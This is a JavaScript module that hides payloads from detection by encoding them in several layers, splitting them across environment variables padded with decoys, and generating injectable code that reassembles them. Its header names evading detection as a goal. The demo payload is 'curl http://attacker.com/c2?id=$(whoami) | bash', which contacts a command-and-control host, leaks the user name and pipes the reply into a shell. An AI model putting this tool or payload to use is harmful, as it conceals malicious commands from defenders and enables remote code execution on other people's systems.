/**
 * Environment Variable Obfuscator
 *
 * Implements secure obfuscation of sensitive payloads by:
 * 1. Encoding payloads through multiple layers (Base64 → Hex → Array)
 * 2. Splitting encoded data across multiple environment variables
 * 3. Injecting noise/decoys to evade detection
 * 4. Providing reconstruction logic that can be injected into target environments
 *
 * Usage:
 *   const obfuscator = new EnvVarObfuscator();
 *   const result = obfuscator.obfuscate(payload, { chunks: 4 });
 *   // result contains { variables, reconstructor, metadata }
 */

const crypto = require('crypto');

class EnvVarObfuscator {
  constructor(options = {}) {
    this.options = {
      chunkSize: options.chunkSize || null, // Auto-calculate if null
      numChunks: options.numChunks || 4,
    };
  }

  /**
   * Base64 encode a string
   */
  encodeBase64(input) {
    return Buffer.from(input, 'utf8').toString('base64');
  }

  /**
   * Base64 decode a string
   */
  decodeBase64(base64) {
    return Buffer.from(base64, 'base64').toString('utf8');
  }

  /**
   * Convert Base64 to hex representation
   */
  encodeHex(base64String) {
    let hex = '';
    for (let i = 0; i < base64String.length; i++) {
      const charCode = base64String.charCodeAt(i);
      hex += charCode.toString(16).padStart(2, '0');
    }
    return hex;
  }

  /**
   * Convert hex string back to Base64
   */
  decodeHex(hexString) {
    let result = '';
    for (let i = 0; i < hexString.length; i += 2) {
      const hex = hexString.substr(i, 2);
      result += String.fromCharCode(parseInt(hex, 16));
    }
    return result;
  }

  /**
   * Convert hex string to array of hex pairs
   */
  encodeArray(hexString) {
    const array = [];
    for (let i = 0; i < hexString.length; i += 2) {
      array.push(hexString.substr(i, 2));
    }
    return array;
  }

  /**
   * Convert array of hex pairs back to hex string
   */
  decodeArray(array) {
    return array.join('');
  }

  /**
   * Multi-layer encode: Original → Base64 → Hex → Array
   */
  multiEncode(input) {
    const base64 = this.encodeBase64(input);
    const hex = this.encodeHex(base64);
    const array = this.encodeArray(hex);
    return { base64, hex, array };
  }

  /**
   * Multi-layer decode: Array → Hex → Base64 → Original
   */
  multiDecode(encodedData) {
    const hex = this.decodeArray(encodedData.array);
    const base64 = this.decodeHex(hex);
    const original = this.decodeBase64(base64);
    return original;
  }

  /**
   * Generate random hex string of specified length
   */
  generateNoise(length) {
    return crypto.randomBytes(length / 2).toString('hex');
  }

  /**
   * Generate a valid-looking but fake chunk
   */
  generateDecoy() {
    return crypto.randomBytes(16).toString('hex').toUpperCase();
  }

  /**
   * Split hex string into equal-sized chunks
   */
  splitIntoChunks(hexString, numChunks) {
    const chunkSize = Math.ceil(hexString.length / numChunks);
    const chunks = [];
    for (let i = 0; i < hexString.length; i += chunkSize) {
      chunks.push(hexString.substr(i, chunkSize));
    }
    return chunks;
  }

  /**
   * Generate obfuscated environment variables
   *
   * Options:
   *   - chunks: number of env vars to split payload across (default: 4)
   *   - addDecoys: boolean to add fake variables (default: true)
   *   - numDecoys: number of decoy variables to add (default: 3)
   *   - prefix: prefix for variable names (default: 'OBF')
   *   - shuffle: whether to shuffle variable order (default: true)
   */
  obfuscate(payload, options = {}) {
    const opts = {
      chunks: options.chunks || this.options.numChunks,
      addDecoys: options.addDecoys !== false,
      numDecoys: options.numDecoys || 3,
      prefix: options.prefix || 'OBF',
      shuffle: options.shuffle !== false,
    };

    // Encode payload
    const encoded = this.multiEncode(payload);
    const hexString = encoded.hex;

    // Split into chunks (ensure at least one chunk even if empty)
    const chunks = hexString.length > 0
      ? this.splitIntoChunks(hexString, opts.chunks)
      : [''];

    // Create environment variables (in order)
    const variables = {};
    const dataVarNames = []; // Track actual data vars (no decoys)

    chunks.forEach((chunk, index) => {
      const varName = `${opts.prefix}_${index}`;
      variables[varName] = chunk;
      dataVarNames.push(varName);
    });

    // Add decoy variables if requested
    const decoys = {};
    if (opts.addDecoys) {
      for (let i = 0; i < opts.numDecoys; i++) {
        const decoyName = `${opts.prefix}_DECOY_${i}`;
        const decoyValue = this.generateDecoy();
        variables[decoyName] = decoyValue;
        decoys[decoyName] = decoyValue;
      }
    }

    // Create final var names list for all variables (possibly shuffled)
    let allVarNames = [...dataVarNames, ...Object.keys(decoys)];
    if (opts.shuffle) {
      // Shuffle all variables
      for (let i = allVarNames.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [allVarNames[i], allVarNames[j]] = [allVarNames[j], allVarNames[i]];
      }
    }

    // Generate reconstructor code using original data order
    const reconstructor = this.generateReconstructor(
      dataVarNames,
      opts.prefix,
      decoys
    );

    return {
      variables,
      varNames: allVarNames,           // All variables (for export, possibly shuffled)
      dataVarNames: dataVarNames,      // Just data chunks in correct order (for reconstruction)
      reconstructor,
      metadata: {
        originalLength: payload.length,
        encodedLength: hexString.length,
        numChunks: chunks.length,
        numDecoys: Object.keys(decoys).length,
        prefix: opts.prefix,
      },
    };
  }

  /**
   * Generate JavaScript code that reconstructs the original payload
   */
  generateReconstructor(varNames, prefix, decoys) {
    const decoyNames = Object.keys(decoys);

    return `
(function() {
  // Environment variable obfuscation reconstructor
  // Filters out decoys and reconstructs original payload

  function reconstructPayload() {
    const chunks = [
      ${varNames.map(name => `process.env.${name}`).join(',\n      ')}
    ];

    const decoyPatterns = [
      ${decoyNames.map(name => `'${name}'`).join(',\n      ')}
    ];

    // Reconstruct hex string from non-decoy chunks
    const hexString = chunks
      .filter(chunk => chunk && typeof chunk === 'string')
      .join('');

    // Hex to ASCII conversion
    let base64 = '';
    for (let i = 0; i < hexString.length; i += 2) {
      const hex = hexString.substr(i, 2);
      base64 += String.fromCharCode(parseInt(hex, 16));
    }

    // Base64 decode
    const payload = Buffer.from(base64, 'base64').toString('utf8');
    return payload;
  }

  return reconstructPayload();
})();
`;
  }

  /**
   * Generate environment variable export statements (shell)
   */
  generateShellExport(variables) {
    let script = '#!/bin/bash\n\n';
    script += '# Obfuscated environment variables\n';

    Object.entries(variables).forEach(([name, value]) => {
      script += `export ${name}="${value}"\n`;
    });

    return script;
  }

  /**
   * Reconstruct original payload from obfuscated environment variables
   * varNames parameter should be the actual data chunks in correct order (non-decoy vars)
   */
  reconstructFromEnv(envVariables, varNames) {
    // Concatenate chunks in the EXACT order provided (which should exclude decoys)
    const hexString = varNames
      .map(name => envVariables[name])
      .filter(val => val !== undefined && val !== null)
      .join('');

    // Handle empty payloads (will have empty or single-chunk hex)
    if (hexString.length === 0) {
      return '';
    }

    // Hex to Base64
    let base64 = '';
    for (let i = 0; i < hexString.length; i += 2) {
      const hex = hexString.substr(i, 2);
      base64 += String.fromCharCode(parseInt(hex, 16));
    }

    // Base64 to original
    return this.decodeBase64(base64);
  }

  /**
   * Generate a complete obfuscation report
   */
  generateReport(payload, obfuscationResult) {
    const report = {
      summary: {
        originalPayload: payload,
        originalLength: payload.length,
      },
      encoding: {
        base64Length: obfuscationResult.metadata.encodedLength,
        numChunks: obfuscationResult.metadata.numChunks,
        numDecoys: obfuscationResult.metadata.numDecoys,
      },
      variables: obfuscationResult.variables,
      varNames: obfuscationResult.varNames,
      usage: {
        shell: 'Set environment variables using: export VAR_NAME="value"',
        nodejs: `const payload = require('env-var-obfuscator').reconstructFromEnv(process.env, varNames);`,
        python: `payload = base64.b64decode(hex_string).decode('utf-8')`,
      },
      reconstructor: obfuscationResult.reconstructor,
    };

    return report;
  }
}

// Export the class and factory function
module.exports = EnvVarObfuscator;

// Convenience factory
function createObfuscator(options) {
  return new EnvVarObfuscator(options);
}

module.exports.createObfuscator = createObfuscator;

// Example usage
if (require.main === module) {
  console.log('=== Environment Variable Obfuscator Demo ===\n');

  const obfuscator = new EnvVarObfuscator();

  // Example payload
  const payload =
    'curl http://attacker.com/c2?id=$(whoami) | bash';
  console.log(`Original Payload: ${payload}\n`);

  // Obfuscate
  const result = obfuscator.obfuscate(payload, {
    chunks: 4,
    addDecoys: true,
    numDecoys: 3,
    prefix: 'APP',
  });

  console.log('=== Obfuscated Variables ===');
  console.log(JSON.stringify(result.variables, null, 2));

  console.log('\n=== Variable Order ===');
  console.log(result.varNames);

  console.log('\n=== Metadata ===');
  console.log(JSON.stringify(result.metadata, null, 2));

  console.log('\n=== Shell Export Script ===');
  console.log(obfuscator.generateShellExport(result.variables));

  console.log('\n=== Reconstructor Code ===');
  console.log(result.reconstructor);

  console.log('\n=== Reconstruction Test ===');
  // Use dataVarNames which are in correct order and exclude decoys
  const reconstructed = obfuscator.reconstructFromEnv(
    result.variables,
    result.dataVarNames
  );
  console.log(`Reconstructed: ${reconstructed}`);
  console.log(
    `Verification: ${reconstructed === payload ? 'PASS ✓' : 'FAIL ✗'}`
  );
}
